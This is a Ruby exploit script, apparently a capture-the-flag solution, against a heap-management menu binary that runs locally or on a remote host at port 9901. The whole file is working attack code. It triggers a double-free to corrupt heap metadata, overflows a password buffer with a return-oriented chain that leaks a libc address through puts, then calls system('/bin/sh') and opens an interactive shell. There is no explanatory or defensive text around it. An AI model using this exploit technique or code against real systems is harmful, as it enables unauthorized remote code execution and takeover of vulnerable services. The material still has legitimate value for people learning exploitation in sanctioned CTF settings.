#!/usr/bin/env ruby
require '~/Tools/pwnlib.rb'

local = true
if local
	host, port = '127.0.0.1', 4444
	system_offset = 0x41490
	puts_offset = 0x6b990
	sh_offset = 0x13012
else
	host, port = '52.175.144.148', 9901
	system_offset = 0x46590
	puts_offset = 0x6fd60
	sh_offset = 0x156a2
end

def p64(*addr)
	return addr.pack("Q*")
end

def free(number)
	@r.recv_until("$")
        @r.send("2\n")
	@r.recv_until("Free Chunk number: ")
	@r.send("#{number}\n")
	@r.recv_until("Fuck the free Success")
end
def quit()
	@r.recv_until("$")
        @r.send("5\n")
end

def malloc(number, size, data)
	@r.recv_until("$")
	@r.send("1\n")
	@r.recv_until("Allocate Chunk Number: ")
	@r.send("#{number}\n")
	@r.recv_until("Input Size: ")
	@r.send("#{size}\n")
	@r.recv_until("Input Data: ")
	@r.send("#{data}\n")
end
PwnTube.open(host, port) do |r|
	@r = r
	pop_rdi_ret = 0x00000000004008a0 #: pop rdi ; ret
	puts_got = 0x602020
	puts = 0x400600
	main = 0x400680

	malloc(1, 96, "1")
	malloc(2, 96, "2")
	free(1)	
	free(2)	
	free(1)
	malloc(1, 96, p64(0x60206d))
	malloc(2, 96, "3")
	malloc(3, 96, "4")
	malloc(4, 96, "5"*3)
	
	@r.recv_until("$")
	@r.send("4\n")	
	@r.recv_until("Input password: ")

	payload = "a"*1032
	payload << p64(pop_rdi_ret, puts_got, puts)
	payload << p64(main)
	payload << p64(pop_rdi_ret, puts_got, puts)
	payload << p64(main)
	
	@r.send(payload+"\n")
	@r.recv(8)

	quit()
	@r.recv(1)
	libc_base = @r.recv(6).ljust(8,"\0").unpack("Q")[0] - puts_offset
	system = libc_base + system_offset
	sh = libc_base + sh_offset

	puts "[!] libc base : 0x#{libc_base.to_s(16)}"
	puts "[!] system : 0x#{system.to_s(16)}"
	puts "[!] sh : 0x#{sh.to_s(16)}"
	
	@r.recv_until("$")
	@r.send("4\n")	
	@r.recv_until("Input password: ")
	
	payload = "b"*1032
	payload << p64(pop_rdi_ret, sh, system)
	@r.send(payload)
	quit()
	@r.interactive()
end
